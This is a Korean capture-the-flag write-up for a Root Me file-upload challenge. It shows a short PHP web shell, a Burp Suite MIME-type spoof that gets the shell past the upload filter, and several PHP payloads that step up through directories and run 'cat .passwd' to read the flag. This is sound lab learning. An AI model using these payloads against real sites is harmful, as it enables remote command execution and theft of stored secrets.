<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>Root ME Web Hacking File upload - MIME type Write-Up</h1>
</body>
<br>
<br>
</html>

![10](https://github.com/user-attachments/assets/45e4e619-b038-43cc-bb0e-4246c523847a)

문제를 읽어보면 php파일을 업로드하고 패스워드는 .passwd 파일안에 있다고 한다.
문제 사이트로 접속해보자

![image](https://github.com/user-attachments/assets/f9a75397-f5b1-4580-827e-3c01df0314c0)


upload로 들어가니 사진을 업로드 할 수 페이지가 나온다

![image](https://github.com/user-attachments/assets/be4a6b3e-dd5f-4d06-a73f-2b3721f4d1e1)

![image](https://github.com/user-attachments/assets/9c285c9b-c103-40c1-85ef-5d4b48245955)

파일 업로드 취약점을 이용해 php 파일을 업로드 해보면 될 것 같다.

일단 간단하게 웹쉘을 만들어 보았다.

```python
<?php
  system($_GET[cmd]);
?>
```

그리고 burp suite를 사용 해서 MIME type을 image/png로 바꿔 주었다.

+MIME type이란?

클라이언트에게 전송된 문서의 다양성을 알려주기 위한 메커니즘

웹에서 파일의 확장자는 별 의미가 없다. 그러므로, 각 문서와 함께 올바른 MIME type을 전송하도록, 서버가 정확시 설정하는것이 중요하다.

브라우저들은 리소스를 내려받았을 때 해야 할 기본 동작이 무엇인지를 결정하기 위해 MIME type을 사용한다.

![1](https://github.com/user-attachments/assets/ab6b943e-fe1a-4720-b3a9-ce5549075acf)

![2](https://github.com/user-attachments/assets/ee1fa22b-3de7-42e8-9bab-949b63141dd4)

MIME type을 바꾸고 Forward하면 shell.php 파일이 업로드 된것을 확인할 수 있다.

![3](https://github.com/user-attachments/assets/6e3d0fc7-79a1-4f8d-a814-e860bdb3f9d3)

업로드된 파일에 들어가서 url에 cmd 명령어를 입력해 보았다.

![4](https://github.com/user-attachments/assets/a00ecac3-f513-4073-8148-cff3e27b3f5a)

![9](https://github.com/user-attachments/assets/f6e99fb9-4435-4c89-a602-79d7fb0e8a6c)

그러나 계속 sign in 하라고 창만 뜨고 cmd명령어가 실행되지 않는다. 

shell.php 코드를 바꿔가면서 cmd 명령어를 실행해보려고 시도해 봤으나 도저히 되지 않아 방법을 바꿔보기로 했다.

shell.php 코드를 아래 처럼 계속해서 상위디렉토리로 이동하도록 만들고 번거롭지만 계속 업로드해가며 .passwd파일을 찾아보았다.

```python
<?php
  echo exec('cd ..;cat .passwd');
?>
```

```python
<?php
  echo exec('cd ../..;cat .passwd');
?>
```

```python
<?php
  echo exec('cd ../../..;cat .passwd');
?>
```

최종적으로 상위 디렉토리로 세번 이동하고 나서야 .passwd 파일을 찾을 수 있었다.

![6](https://github.com/user-attachments/assets/636a1a21-6f1f-4d04-82fc-dcc3676d98a9)

플래그가 맞는지 확인하기 위해 root me 사이트에 넣어보니 well done이 나왔다!!

![7](https://github.com/user-attachments/assets/d6cd9ad9-044b-4a83-a5b1-4fc633e492d0)

